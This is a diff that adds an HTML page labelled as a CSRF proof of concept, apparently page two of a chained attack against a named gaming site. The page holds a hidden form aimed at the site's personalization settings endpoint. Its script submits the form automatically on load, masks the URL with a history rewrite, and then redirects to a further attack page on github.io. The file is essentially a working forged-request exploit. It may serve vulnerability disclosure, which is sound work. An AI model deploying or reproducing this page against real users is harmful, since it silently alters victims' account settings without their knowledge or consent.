@@ -1,0 +1,25 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>CSRF PoC - page2 (auto submit)</title></head>
+<body>
+  <h3>Page 2 — auto-submits on load</h3>
+
+  <form id="p2" action="https://gamesnacks.com/settings/personalization/save?eom=false&l1=false&cm=1&hist=true" method="POST">
+    <input type="hidden" name="dummy" value="enable_cookies_sim" />
+  </form>
+
+  <script>
+    // Make this page auto-submit once loaded, but still allow you to inspect it
+    window.addEventListener('load', function () {
+      // push a clean history entry so URL is nicer (optional)
+      history.pushState('', '', '/');
+      // submit form immediately
+      document.getElementById('p2').submit();
+      // after a short delay, navigate to page3
+      setTimeout(function() {
+        window.location.href = 'https://eslammonex.github.io/testtwo/game-csrf3.html';
+      }, 500); // small delay to let server respond (adjust if needed)
+    });
+  </script>
+</body>
+</html>
